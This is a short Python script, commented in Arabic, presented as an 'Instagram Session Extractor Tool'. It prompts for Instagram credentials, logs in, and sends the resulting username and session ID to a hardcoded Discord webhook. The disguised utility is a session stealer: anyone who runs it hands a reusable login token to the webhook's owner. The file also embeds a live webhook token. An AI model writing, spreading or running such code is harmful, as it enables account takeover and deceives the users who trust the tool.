import requests
import getpass
import os
import json

# رابط تغذية الديسكورد
WEBHOOK_URL = "https://discord.com/api/webhooks/1236844740842885141/rUltL-f02vB8eiCh8-BqVYk2V5mWUQ5KnDDDEmNNPRWKBgUcJLjG2aOOMN0uDprh9dld"

def clear_screen():
    try:
        os.system('clear')
    except:
        print("\n" * 50)  # بديل للتنظيف في بيئات لا تدعم os.system

def banner():
    clear_screen()
    print("=" * 50)
    print("🎯 Instagram Session Extractor Tool")
    print("Developed by devlikesofe")
    print("=" * 50)

def send_to_discord(username, session_id):
    payload = {
        "content": f"✅ Instagram Session Extracted:\n**Username:** {username}\n**Session ID:** ```{session_id}```"
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print("📢 تم إرسال الإشعار إلى الديسكورد بنجاح!")
        else:
            print(f"⚠️ فشل في إرسال الإشعار (كود: {response.status_code})")
    except Exception as e:
        print(f"❌ خطأ في إرسال الإشعار: {e}")

def login(username, password):
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Referer": "https://www.instagram.com/accounts/login/",
        "X-IG-App-ID": "124024574287414"
    })

    try:
        print("🔄 جاري الاتصال بإنستغرام...")
        session.get("https://www.instagram.com/")
        csrf = session.cookies.get_dict().get("csrftoken")

        if not csrf:
            print("❌ فشل في الحصول على CSRF Token!")
            return None

        session.headers.update({
            "X-CSRFToken": csrf,
            "Content-Type": "application/x-www-form-urlencoded"
        })

        login_data = {
            'username': username,
            'enc_password': f"#PWD_INSTAGRAM_BROWSER:0:0:{password}",
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }

        res = session.post("https://www.instagram.com/accounts/login/ajax/", data=login_data)

        if res.status_code == 200 and res.json().get("authenticated"):
            session_id = session.cookies.get_dict().get("sessionid")
            if session_id:
                print("✅ تم تسجيل الدخول بنجاح!")
                print(f"🎉 Session ID: {session_id}")
                send_to_discord(username, session_id)
                return session_id
            else:
                print("❌ تم التسجيل لكن لم يتم العثور على Session ID!")
        else:
            print("❌ فشل تسجيل الدخول! تأكد من اليوزر والباسورد.")
            print(res.text)
    except Exception as e:
        print(f"❌ حدث خطأ: {e}")
    return None

def main():
    banner()
    username = input("👤 أدخل اسم المستخدم: ").strip()
    password = getpass.getpass("🔒 أدخل كلمة المرور: ")

    login(username, password)

    input("\n👉 اضغط Enter للخروج...")

if __name__ == "__main__":
    main()
